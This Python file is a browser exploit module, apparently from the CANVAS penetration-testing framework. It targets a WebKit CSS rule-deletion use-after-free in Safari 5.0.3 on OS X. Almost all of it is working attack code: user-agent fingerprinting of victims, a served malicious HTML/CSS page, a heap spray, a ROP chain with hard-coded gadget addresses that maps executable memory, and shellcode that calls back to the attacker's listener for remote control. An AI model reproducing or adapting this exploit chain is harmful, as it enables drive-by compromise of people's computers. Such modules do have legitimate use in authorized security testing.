#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
import random
import canvasengine
from libs.ua_parser import user_agent_parser

NAME                            = "Safari <= 5.0.3"
DESCRIPTION                     = "Clientside exploit for WebKit css rule deletion vulnerability."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apple"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["Reference"]      = ""
DOCUMENTATION["CVE"]            = ""
DOCUMENTATION["CVE url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name="
DOCUMENTATION["BUGTRAQ url"]    = "https://bugs.webkit.org/show_bug.cgi?id=51993"
DOCUMENTATION["NOTES"]          = """
This exploit will work under Safari <= 5.0.3 with OSX10.6.6 64bit.
Fixed in WebKit revision r75168 (http://trac.webkit.org/changeset/75168).

For more details on the vulnerability itself, please see:
http://svnsearch.org/svnsearch/repos/WEBKIT/search?logMessage=51993
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["MacOSX"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'
TARGETS = { 0 : ['Safari 5.0.3'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME

        import random
        # filename is used in the actual http server
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.cssfile            = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".css"
        # universal shellcode?
        self.universal          = True
        return

    def is_vulnerable(self,info):
        parsed = user_agent_parser.Parse(info['user_agent'])


        if "Mac OS X" in parsed['os']['family'] and \
           "Safari" in parsed['user_agent']['family']:

            try:
                patch = int(parsed['user_agent']['patch'])
            except Exception:
                return 0

            if parsed['user_agent']['major'] == '5' and \
               parsed['user_agent']['minor'] == '0' and \
               patch <= 3:

                return 100

        return 0

    def neededListenerTypes(self):
        if self.universal:
            return [canvasengine.UNIVERSAL_MOSDEF]
        else:
            return [canvasengine.OSXMOSDEF_X64]

    def createShellcode(self):
        from shellcode.standalone.osx.payloads64 import payloads
        p = payloads()
        # We are setting the shellcode with fork_exit as we dont want safari to hang
        asm = p.callback(self.callback.ip, self.callback.port, universal=self.universal,fork_exit=True);
        self.shellcode = p.assemble(asm)
        return self.shellcode

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def make_rop(self):
        def escape(num):
            import struct
            t = struct.unpack("<HHHH",struct.pack("<Q",num))
            unistr=""
            for i in t:
                unistr += "%%u%.4x" % i
            return unistr
        base=0x134188020  #rax address, start of rop+shellcode block
        noimp="%ucccc"*4
        rop =escape(base) # call rax+0x10
        rop+=noimp
        rop+=escape(0x7FFF5FC04770) # mov (rdi) rax;call rax+0x110
        rop+=noimp*4
        rop+=escape(base+0x120) #rsp addr:mmap rop init
        rop+=noimp*26
        rop+=escape(0x7FFF5FC24CD8) # mov (rdi+0x38),rsp; pop rdi; ret
        rop+=noimp
        rop+=escape(base+0x130) #rdi ^
        rop+=escape(0x7FFF5FC24CA1) # from *(rdi+offset) to regs
        rop+=noimp*2
        rop+=escape(0x1012) # MAP_FIXED|MAP_ANON|MAP_PRIVATE
        rop+=escape(0x6)    # PROT_EXEC|PROT_WRITE
        rop+=noimp
        rop+=escape(0x2000) # Size
        rop+=noimp
        rop+=escape(base+0x1b0)
        rop+=escape(0)*2    # Fd,Offset
        rop+=noimp*6
        #address to mmap and copy shellcode
        shellcodeaddr=0x60000000000
        rop+=escape(shellcodeaddr)  # Address
        rop+=escape(0x7FFF5FC1FAEA) # <__dyld_mmap>
        rop+=escape(0x7FFF5FC24CDC) # pop rdi; ret
        rop+=escape(base+0x1d8)     # rdi ^
        rop+=escape(0x7FFF5FC24CA1) # from *(rdi+offset) to regs
        rop+=noimp*3
        rop+=escape(0x1000)         # size
        rop+=noimp
        rop+=escape(base+0x270)     # src
        rop+=noimp
        rop+=escape(base+0x258)     # rsp
        rop+=noimp*8
        rop+=escape(shellcodeaddr)  # dst
        rop+=escape(0x7FFF5FC234F0) # <__dyld_memcpy>
        rop+=escape(shellcodeaddr)  # ret_to_here after memcpy
        rop+=urluencode(self.createShellcode()) # shellcode
        #rop = escape(0xcccccccccccccccc)*0x100
        self.log("Rop generated of len %d" % len(rop) )
        return (rop,base-0x100000000)

    def run(self):
        self.log("Run this from clientd")
        return 0

    def make_css(self):
        css = """
        h1{
          color: white;
        }
        """
        return css

    def makefile(self):
        html="""
        <html>
         <style id="target" type="text/css">
          @import url("%s");
         </style>
         <script>
        """ % self.cssfile
        script="""
        function run(){
          str = unescape("%s");
          var heap_quant=0x200;
          var heap=new Array(heap_quant);
          while(str.length!=0x1000/2) str+="\udddd";
          for(i=0;i<heap_quant;i++){
            var spray=str.substr(0,str.length);
            var size = (0x180000-0x20)/2;
            while(spray.length<size) {
             if(size-spray.length<spray.length){
              spray+=spray.substring(0,size-spray.length);
             }else{
              spray+=spray.substr(0,spray.length);
             }
            }
            heap[i]=spray;
          }

          var t = new Array();
          var rule=document.getElementById("target").sheet.rules[0];
          var obj=document.getElementById("target");
          obj.parentElement.removeChild(obj);
          obj=null;
          for (i=0;i<4400;i++) {
            try { obj.x(); } catch(e) {}
          }
          //alloc freed object
          for (i=0;i<0x100000;i++){
            t[i] = new Array(0x12);
            t[i][0]="imm";
            t[i].length=0x%X;
          }
          rule.parentStyleSheet;
          for (i=0;i<=heap_quant;i++){
            var b = t[i].length;
          }
          alert("not vulnerable");
        }

        """ % self.make_rop()
        html+=script
        html+="""
         </script>
         <body onload="javascript:run();">
         </body>
        </html>
        """
        return html


    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body

        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")

            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
            #h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        elif clientheader.URL.count(self.cssfile):
            self.log('Serving CSS file')
            sploitstring=self.make_css()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/css')
            #h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
